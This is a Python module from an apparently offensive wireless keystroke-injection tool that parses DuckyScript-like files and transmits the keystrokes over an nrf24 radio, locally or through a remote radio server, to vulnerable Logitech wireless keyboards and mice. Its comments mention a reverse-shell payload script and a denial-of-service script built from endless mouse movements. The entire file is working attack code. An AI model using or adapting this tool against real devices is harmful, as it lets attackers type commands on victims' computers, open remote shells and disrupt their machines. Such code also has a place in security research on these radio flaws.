from .injection_utils import *
from .hid_scan_codes import *
from .vendors import logitech


def parse_script_file(radio, filename, vendor=logitech):
    """
    This function receives a radio parameter (can either be a RadioServer for remote attack, or nrf24 for local attack),
    a path of a DuckyScript-like file, and the vendor of the vulnerable device.
    It reads the file content into a text string and passes it to the parse_script function, which in turn
    parses the DuckyScript text line by line and injects the keystrokes corresponding to each line as it goes.
    A ValueError is raised in case the script contains an unsupported command.
    """
    with open(filename, 'r') as f:
        script = f.read()
        parse_script(radio, script, vendor)


def parse_script(radio, script, vendor=logitech):
    """
    This function receives a radio parameter (can either be a RadioServer for remote attack, or nrf24 for local attack),
    a string containing DuckyScript-like text, and the vendor of the vulnerable device.
    It parses the DuckyScript text line by line and injects the keystrokes corresponding to each line as it goes.
    A ValueError is raised in case the script contains an unsupported command.
    """
    lines = script.split('\n')
    index = 0 # index of current line

    while index < len(lines):
        line = lines[index].strip() # remove leading and trailing whitespaces (to support tabs for example)
        if not line: # ignore empty lines
            index += 1
            continue
        parts = line.split() # split line into command and arguments
        if len(parts) == 0:
            index += 1
            continue
        command = parts[0]
        args = parts[1:]

        # syntax: REM [comment]
        if command == 'REM':
            index += 1 # DuckyScript comment - skip to next line
            continue

        # syntax: WINDOWS [combined key name]
        elif command == 'WINDOWS':
            if args:
                # For simplicity, assuming only non-character keys may follow a WINDOWS command (to support "WINDOWS DOWN" at reverse_shell.txt),
                # even though standard DuckyScript supports instructions like: WINDOWS r.
                scan_code = other_keys[args[0]][0]
            else:
                scan_code = KEY_NONE
            inject_keystrokes(radio, [[scan_code, KEY_MOD_LMETA]], vendor) # using Windows key modifier

        # syntax: STRING [string to inject]
        elif command == 'STRING':
            transmit_string(radio, ' '.join(args), vendor) # if there are multiple arguments, it means that the requested string contains spaces, so we re-insert them
        
        # syntax: DELAY [delay in ms]
        elif command == 'DELAY':
            # patch: treating DELAY as a "keystroke" passed to inject_keystrokes(), by using a custom scan code defined for this purpose, and passing the interval (in ms) through the modifier
            inject_keystrokes(radio, [[KEY_DELAY, int(args[0])]], vendor)
        
        # syntax: CTRL-SHIFT [combined key name]
        elif command == 'CTRL-SHIFT':
            # like the WINDOWS command, assuming only non-character keys may follow (to support "CTRL-SHIFT ENTER" at reverse_shell.txt)
            inject_keystrokes(radio, [[other_keys[args[0]][0], KEY_MOD_LCTRL | KEY_MOD_RSHIFT]], vendor) # using CTRL and SHIFT modifiers along with the requested key
        
        # syntax: MOUSE_MOVE [X velocity] [Y velocity]
        elif command == "MOUSE_MOVE":
            # patch: using try_transmit only in the case of mouse movement so that we search for the channel again if it gets lost while running the DoS DuckyScript
            try_transmit(radio, logitech.mouse_move_payload(args[0].replace("0x", ""), args[1].replace("0x", ""))) # trimming 0x before passing the values to the function
       
        # infinite loop syntax (no graceful exit mechanism was implemented for this case, use a keyboard interrupt to stop injecting the script):
        # WHILE TRUE
        #     code to repeat
        # END_WHILE
        elif command == 'WHILE':
            if args[0] == 'TRUE':
                loop_start = index + 1 # store the index of the first line in the infinite loop
            else:
                raise ValueError('Invalid WHILE statement') # only infinite loops are supported
        elif command == 'END_WHILE':
            index = loop_start # set the index to go to the first line of the infinite loop
            continue # skip index += 1 at the end
        
        # syntax: [key name] (to support commands like ENTER, TAB...)
        elif command in other_keys.keys():
            transmit_keys(radio, [command], vendor)
        
        else:
            raise ValueError(f'Unknown command: {command}')
        
        index += 1 # continue to next line
